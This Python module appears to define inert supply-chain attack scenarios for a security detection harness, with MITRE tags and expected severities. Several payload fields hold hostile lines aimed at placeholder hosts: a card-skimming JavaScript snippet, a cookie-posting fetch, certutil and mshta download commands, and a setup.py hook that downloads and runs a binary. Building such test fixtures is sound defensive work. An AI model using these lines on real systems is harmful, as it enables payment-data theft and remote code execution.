"""Supply-chain attack scenario definitions (SAFE / inert payloads only).

Every payload in this module is **deterministic, self-contained, and
harmless**.  No real exploits, no live C2 callbacks, no actual malware.
All IOCs use RFC-5737 / RFC-2606 reserved ranges or ``example.com``
domains so they cannot affect production infrastructure.

Scenario taxonomy
-----------------
SC-01  Magecart / JS skimmer injection
SC-02  Watering-hole / trusted-site compromise
SC-03  CI/CD pipeline poisoning
SC-04  C2 beaconing (DNS / HTTPS)
SC-05  LOLBin / living-off-the-land abuse
SC-06  Macro-enabled document delivery
SC-07  Dependency confusion / typosquatting (shai-hulud style)
SC-08  Firmware / hardware supply-chain implant

Each scenario returns a dict consumed by the simulation harness (see
``supply_chain_harness.py``).  The dict has a stable contract::

    {
        "scenario_id":   "SC-01",
        "name":          "Magecart JS Skimmer",
        "mitre_attack":  ["T1195.002", "T1059.007"],
        "owasp_tags":    ["LLM05:SupplyChainVulnerabilities"],
        "kill_chain":    ["initial_access", "execution", "exfiltration"],
        "payload":       { ... },          # inert artefact
        "expected_signals": ["supply_chain", "data_exfiltration", ...],
        "expected_severity": "high",
        "human_escalation_expected": True,
        "description":   "...",
    }
"""

from __future__ import annotations

from typing import Any, Dict, List


# ── SC-01  Magecart / JS skimmer ────────────────────────────────────────

def sc01_magecart_js_skimmer() -> Dict[str, Any]:
    """Simulate a compromised third-party JS library injecting a skimmer."""
    return {
        "scenario_id": "SC-01",
        "name": "Magecart JS Skimmer Injection",
        "mitre_attack": ["T1195.002", "T1059.007"],
        "owasp_tags": ["LLM05:SupplyChainVulnerabilities"],
        "kill_chain": ["initial_access", "execution", "collection", "exfiltration"],
        "payload": {
            "event_type": "js_integrity_violation",
            "library": "checkout-analytics-v3.min.js",
            "expected_hash": "sha256:aabbccdd1122334455667788",
            "observed_hash": "sha256:deadbeef00112233cafebabe",
            "injected_snippet": (
                "/* INERT DEMO PAYLOAD – NOT REAL CODE */\n"
                "var x=document.querySelector('input[name=cc]');\n"
                "new Image().src='https://exfil.example.com/c?d='+btoa(x.value);\n"
            ),
            "exfil_domain": "exfil.example.com",  # RFC-2606 reserved
            "sri_expected": True,
            "sri_present": False,
            "csp_report_uri": "https://csp.example.com/report",
        },
        "expected_signals": ["supply_chain", "data_exfiltration"],
        "expected_severity": "critical",
        "human_escalation_expected": True,
        "description": (
            "A third-party JavaScript library loaded on the checkout page has been "
            "tampered with.  The injected snippet harvests credit-card input fields "
            "and exfiltrates them to an attacker-controlled domain.  SRI hash mismatch "
            "is the first detection signal; CSP violation report is the second."
        ),
    }


# ── SC-02  Watering-hole ────────────────────────────────────────────────

def sc02_watering_hole() -> Dict[str, Any]:
    """Simulate a trusted vendor portal serving a malicious redirect."""
    return {
        "scenario_id": "SC-02",
        "name": "Watering Hole – Trusted Vendor Portal",
        "mitre_attack": ["T1189", "T1204.001"],
        "owasp_tags": ["LLM05:SupplyChainVulnerabilities"],
        "kill_chain": ["initial_access", "execution"],
        "payload": {
            "event_type": "url_reputation_alert",
            "trusted_site": "portal.vendor-example.com",
            "redirect_chain": [
                "https://portal.vendor-example.com/login",
                "https://portal.vendor-example.com/r?t=abc",
                "https://198.51.100.42/payload.html",  # RFC-5737 TEST-NET-2
            ],
            "final_ip": "198.51.100.42",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "geo_country": "XX",
            "dns_anomaly": True,
        },
        "expected_signals": ["supply_chain"],
        "expected_severity": "high",
        "human_escalation_expected": True,
        "description": (
            "Employees visiting a trusted vendor portal are silently redirected "
            "through a chain that terminates at a TEST-NET IP serving an exploit "
            "kit.  DNS CNAME record was modified on the vendor side."
        ),
    }


# ── SC-03  CI/CD pipeline poisoning ─────────────────────────────────────

def sc03_cicd_pipeline_poison() -> Dict[str, Any]:
    """Simulate malicious code injected during the CI/CD build process."""
    return {
        "scenario_id": "SC-03",
        "name": "CI/CD Pipeline Poisoning",
        "mitre_attack": ["T1195.002", "T1059.006"],
        "owasp_tags": ["LLM05:SupplyChainVulnerabilities", "ASI04:AgenticSupplyChainVulnerabilities"],
        "kill_chain": ["initial_access", "execution", "persistence"],
        "payload": {
            "event_type": "build_artefact_anomaly",
            "pipeline": "github-actions",
            "repo": "example-org/checkout-service",
            "commit": "a1b2c3d4e5f6",
            "build_id": "run-42",
            "anomaly": "post_build_diff",
            "diff_summary": (
                "--- a/dist/checkout.js\n"
                "+++ b/dist/checkout.js\n"
                "@@ -1,3 +1,5 @@\n"
                "+/* INERT DEMO – injected during build */\n"
                "+fetch('https://c2.example.com/beacon',{method:'POST',body:document.cookie});\n"
                " // legitimate checkout code\n"
            ),
            "sbom_drift": {
                "added": ["evil-logger@0.0.1"],
                "removed": [],
                "modified": ["lodash@4.17.20 → lodash@4.17.20-rc1"],
            },
            "signing_valid": False,
            "provenance_slsa_level": 0,
        },
        "expected_signals": ["supply_chain", "data_exfiltration"],
        "expected_severity": "critical",
        "human_escalation_expected": True,
        "description": (
            "Build artefact differs from source after CI/CD run.  SBOM shows an "
            "unknown package injected, binary signing failed, and SLSA provenance "
            "is level 0 (none).  Likely TeamCity/GitHub Actions compromise."
        ),
    }


# ── SC-04  C2 beaconing ─────────────────────────────────────────────────

def sc04_c2_beaconing() -> Dict[str, Any]:
    """Simulate periodic C2 beacon traffic from a compromised host."""
    return {
        "scenario_id": "SC-04",
        "name": "C2 Beaconing (DNS + HTTPS)",
        "mitre_attack": ["T1071.001", "T1071.004", "T1573.002"],
        "owasp_tags": ["ASI07:InsecureInterAgentComms"],
        "kill_chain": ["command_and_control"],
        "payload": {
            "event_type": "network_anomaly",
            "beacon_type": "https_periodic",
            "destination_ip": "203.0.113.99",  # RFC-5737 TEST-NET-3
            "destination_domain": "c2.example.com",
            "beacon_interval_sec": 60,
            "jitter_pct": 15,
            "dns_txt_queries": [
                "a]aGVsbG8=.c2.example.com",  # base64 'hello' – inert
                "b]d29ybGQ=.c2.example.com",
            ],
            "user_agent": "Mozilla/5.0 (compatible; beacon/1.0)",
            "tls_ja3": "e7d705a3286e19ea42f587b344ee6865",
            "process_name": "svchost.exe",
            "parent_process": "services.exe",
            "connection_count_24h": 1440,
        },
        "expected_signals": ["supply_chain"],
        "expected_severity": "critical",
        "human_escalation_expected": True,
        "description": (
            "A host is making periodic HTTPS POST requests to a TEST-NET IP "
            "every ~60 seconds with 15% jitter, consistent with Cobalt Strike "
            "malleable C2.  DNS TXT queries encode base64 payloads.  Process "
            "tree shows svchost.exe spawned by services.exe (normal parent, but "
            "the network behaviour is anomalous)."
        ),
    }


# ── SC-05  LOLBin abuse ─────────────────────────────────────────────────

def sc05_lolbin_abuse() -> Dict[str, Any]:
    """Simulate living-off-the-land binary abuse (certutil, mshta, etc.)."""
    return {
        "scenario_id": "SC-05",
        "name": "LOLBin / Living-off-the-Land Abuse",
        "mitre_attack": ["T1218.005", "T1218.011", "T1140"],
        "owasp_tags": ["ASI05:UnexpectedCodeExecution"],
        "kill_chain": ["execution", "defense_evasion"],
        "payload": {
            "event_type": "process_anomaly",
            "commands": [
                "certutil -urlcache -split -f https://dl.example.com/payload.bin payload.bin",
                "mshta https://dl.example.com/evil.hta",
                "rundll32 javascript:\"..\\mshtml,RunHTMLApplication\";document.write('<h1>INERT</h1>')",
                "powershell -encodedcommand SQBuAGUAcgB0AEQAZQB0AGUAYwB0AA==",
            ],
            "lolbin_binaries": ["certutil.exe", "mshta.exe", "rundll32.exe", "powershell.exe"],
            "download_url": "https://dl.example.com/payload.bin",  # example.com = inert
            "encoded_payload_b64": "SQBuAGUAcgB0AEQAZQB0AGUAYwB0AA==",  # "InertDetect" in UTF-16LE
            "process_tree": {
                "pid": 4242,
                "name": "cmd.exe",
                "children": [
                    {"pid": 4243, "name": "certutil.exe", "cmdline": "certutil -urlcache ..."},
                    {"pid": 4244, "name": "mshta.exe", "cmdline": "mshta https://dl.example.com/evil.hta"},
                ],
            },
        },
        "expected_signals": ["supply_chain"],
        "expected_severity": "high",
        "human_escalation_expected": True,
        "description": (
            "An attacker is using legitimate Windows binaries (LOLBins) to "
            "download and execute payloads.  certutil fetches a file from "
            "example.com, mshta runs an HTA, and PowerShell runs a base64-"
            "encoded command.  All payloads are inert demo strings."
        ),
    }


# ── SC-06  Macro-enabled document ───────────────────────────────────────

def sc06_macro_document() -> Dict[str, Any]:
    """Simulate a macro-enabled Office document delivering a payload."""
    return {
        "scenario_id": "SC-06",
        "name": "Macro-Enabled Document Delivery",
        "mitre_attack": ["T1566.001", "T1204.002", "T1059.005"],
        "owasp_tags": ["LLM05:SupplyChainVulnerabilities"],
        "kill_chain": ["initial_access", "execution"],
        "payload": {
            "event_type": "attachment_analysis",
            "filename": "Invoice_Q4_2025.xlsm",
            "content_type": "application/vnd.ms-excel.sheet.macroEnabled.12",
            "sha256": "0000000000000000000000000000000000000000000000000000000000000000",
            "macro_streams": ["ThisWorkbook", "Module1"],
            "vba_suspicious_calls": [
                "Shell(\"cmd /c certutil -urlcache -split -f https://dl.example.com/stage2.exe\")",
                "CreateObject(\"Wscript.Shell\")",
                "Environ(\"APPDATA\")",
            ],
            "auto_open": True,
            "external_links": ["https://dl.example.com/stage2.exe"],
            "ole_objects": [],
            "dde_links": [],
        },
        "expected_signals": ["supply_chain"],
        "expected_severity": "high",
        "human_escalation_expected": True,
        "description": (
            "An Excel macro-enabled workbook (.xlsm) arrives as an email "
            "attachment.  The AutoOpen macro calls cmd.exe → certutil to "
            "download a second-stage executable from example.com.  The VBA "
            "streams and suspicious API calls are extracted for triage."
        ),
    }


# ── SC-07  Dependency confusion / shai-hulud ────────────────────────────

def sc07_dependency_confusion() -> Dict[str, Any]:
    """Simulate a dependency confusion / typosquatting attack."""
    return {
        "scenario_id": "SC-07",
        "name": "Dependency Confusion (Shai-Hulud Style)",
        "mitre_attack": ["T1195.001", "T1195.002"],
        "owasp_tags": ["LLM05:SupplyChainVulnerabilities", "ASI04:AgenticSupplyChainVulnerabilities"],
        "kill_chain": ["initial_access", "execution", "persistence"],
        "payload": {
            "event_type": "sbom_anomaly",
            "package_manager": "pip",
            "internal_package": "shopsquire-utils",
            "typosquat_package": "shopsquire-utlis",  # note: 'utlis' not 'utils'
            "public_registry": "pypi.org",
            "installed_version": "99.0.0",  # suspiciously high version
            "expected_version": "1.2.3",
            "setup_py_commands": [
                "import os; os.system('curl https://c2.example.com/r -o /tmp/r && chmod +x /tmp/r && /tmp/r')",
            ],
            "lockfile_diff": {
                "before": "shopsquire-utils==1.2.3",
                "after": "shopsquire-utlis==99.0.0",
            },
            "provenance": None,
            "signing": None,
        },
        "expected_signals": ["supply_chain"],
        "expected_severity": "critical",
        "human_escalation_expected": True,
        "description": (
            "A dependency confusion attack replaces the internal package "
            "'shopsquire-utils' with a typosquat 'shopsquire-utlis' at version "
            "99.0.0 from the public PyPI registry.  The setup.py contains a "
            "post-install hook that downloads and executes a binary from "
            "c2.example.com (inert demo domain)."
        ),
    }


# ── SC-08  Firmware / hardware implant ──────────────────────────────────

def sc08_firmware_implant() -> Dict[str, Any]:
    """Simulate a firmware-level supply-chain compromise."""
    return {
        "scenario_id": "SC-08",
        "name": "Firmware Supply-Chain Implant",
        "mitre_attack": ["T1195.003", "T1542.001"],
        "owasp_tags": ["LLM05:SupplyChainVulnerabilities"],
        "kill_chain": ["initial_access", "persistence", "command_and_control"],
        "payload": {
            "event_type": "firmware_integrity_alert",
            "device_type": "network_switch",
            "vendor": "example-switch-corp",
            "model": "ES-48-PRO",
            "firmware_version": "3.1.4-modified",
            "expected_hash": "sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890",
            "observed_hash": "sha256:1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
            "anomaly": "Hidden management interface on port 31337 responding to unauthenticated requests",
            "c2_callback_ip": "192.0.2.1",  # RFC-5737 TEST-NET-1
        },
        "expected_signals": ["supply_chain"],
        "expected_severity": "critical",
        "human_escalation_expected": True,
        "description": (
            "A network switch firmware image has been tampered with during "
            "manufacturing.  The modified firmware opens a hidden management "
            "interface on port 31337 and beacons to a TEST-NET IP.  Hash "
            "verification against the vendor's signed image fails."
        ),
    }


# ── Registry ────────────────────────────────────────────────────────────

ALL_SCENARIOS = {
    "SC-01": sc01_magecart_js_skimmer,
    "SC-02": sc02_watering_hole,
    "SC-03": sc03_cicd_pipeline_poison,
    "SC-04": sc04_c2_beaconing,
    "SC-05": sc05_lolbin_abuse,
    "SC-06": sc06_macro_document,
    "SC-07": sc07_dependency_confusion,
    "SC-08": sc08_firmware_implant,
}


def get_scenario(scenario_id: str) -> Dict[str, Any]:
    factory = ALL_SCENARIOS.get(scenario_id.upper())
    if factory is None:
        raise ValueError(f"Unknown scenario: {scenario_id}")
    return factory()


def list_scenarios() -> List[Dict[str, Any]]:
    return [fn() for fn in ALL_SCENARIOS.values()]
